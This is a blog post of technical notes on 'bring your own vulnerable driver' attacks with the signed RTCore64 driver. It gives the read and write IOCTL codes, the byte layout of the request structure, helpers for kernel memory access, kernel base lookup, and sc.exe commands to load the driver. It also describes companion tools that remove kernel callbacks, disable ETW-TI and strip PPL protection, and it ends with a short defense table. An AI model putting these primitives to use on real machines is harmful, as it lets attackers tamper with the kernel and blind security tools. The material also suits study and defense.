---
title: "BYOVD — Bring Your Own Vulnerable Driver with RTCore64"
date: 2026-08-31
categories: [Windows Internals, Offensive]
tags: [byovd, rtcore64, kernel, driver, edr-evasion, windows]
summary: Notes — RTCore64 IOCTLs as WinDbg dq/eb from usermode.
---

# BYOVD notes (RTCore64)

Windows loads only **signed** kernel drivers. BYOVD loads a *signed* driver that already has a bug, then talks to it from usermode.

RTCore64 (MSI Afterburner): device `\\.\RTCore64`. No check on caller, address, or size.

| IOCTL | Op |
|-------|----|
| `0x80002048` | read 1/2/4 bytes at a kernel VA |
| `0x8000204C` | write 1/2/4 bytes at a kernel VA |

Same job as WinDbg `dd`/`dq`/`ed`/`eb`/`eq`, without a debugger.

![flow](/assets/images/byovd-attack-flow.svg)

`callbacks.c` / `etwti.c` / `ppl.c` share this block. Details of callbacks, ETW-TI, PPL are in those posts — this one is the primitive.

Admin is needed to **load** the driver (`SeLoadDriverPrivilege`). The IOCTLs are what usermode APIs cannot do.

---

## Device + buffer

```
CreateFileA("\\\\.\\RTCore64", …)
DeviceIoControl(READ  0x80002048)
DeviceIoControl(WRITE 0x8000204C)
```

`#pragma pack(push, 1)` — driver uses **byte offsets**, not C alignment.

![struct](/assets/images/byovd-rtcore-struct.svg)

```
RTCORE_MEM  (48 bytes)
+0x00  pad0[8]
+0x08  Address     kernel VA
+0x10  pad1[8]
+0x18  Size        1, 2, or 4
+0x1C  Value       write in / read out
+0x20  pad2[16]
```

Pass `&m` as input **and** output. Read fills `Value`.

---

## Helpers = WinDbg

| C | WinDbg |
|---|--------|
| `kread32(a)` | `dd a L1` |
| `kread64(a)` | `dq a L1`  (two `kread32`, low then high) |
| `kwrite32(a,v)` | `ed a v` |
| `kwrite64(a,v)` | `eq a v`  (two `kwrite32`) |
| `kzero64(a)` | `ep a 0` |
| `kwrite8(a,v)` | `eb a v`  (read-modify-write; Size=4, address 4-aligned) |

Max access is **4 bytes**. Pointers = two calls.

Unaligned byte (PPL `Protection`):

```
aligned = addr & ~3
shift   = (addr & 3) * 8
dword   = kread32(aligned)
patch one byte, kwrite32(aligned, dword)
```

Do not `ed` the unaligned address — adjacent fields share the DWORD.

`IS_KERN_VA` = `>= 0xFFFF800000000000`.

---

## Kernel base

Live VA = `kbase + RVA`. RVA = WinDbg `? nt!Symbol - nt`.

Tools use `EnumDeviceDrivers` — `drivers[0]` is `ntoskrnl.exe`:

```
kbase = EnumDeviceDrivers[0]
```

![kbase](/assets/images/byovd-kbase-resolution.svg)

Sanity (same as `db kbase L2`):

```
(kread32(kbase) & 0xFFFF) == 0x5A4D     // MZ
```

Fail = IOCTL did not read kernel (driver not loaded, HVCI, filter).

RVAs change every build. Recompute on the target.

---

## Load / unload

```
sc.exe create RTCore64 type= kernel start= demand binPath= "C:\path\RTCore64.sys"
sc.exe start  RTCore64
sc.exe stop   RTCore64
sc.exe delete RTCore64
```

---

## What the three tools do with this

| Tool | Post | IOCTL use |
|------|------|-----------|
| `callbacks.exe` | kernel-callbacks | `dq` slots/lists, `ep`/`eb`/`eq` remove |
| `etwti.exe` | etw-ti | `dq` silo/bucket, `ed` IsEnabled |
| `ppl.exe` | ppl-deep-dive | walk `_EPROCESS`, `eb` Protection |

Do not copy those walks here.

---

## Defense (short)

| Layer | Effect |
|-------|--------|
| HVCI | blocklist at hypervisor; RTCore64 will not load |
| WDAC `DriverSiPolicy.p7b` | hash deny |
| Event 7045 | `sc create` of a kernel service |
| `PsSetLoadImageNotifyRoutine` | see the `.sys` load |

HVCI is the one that actually stops the IOCTL path.
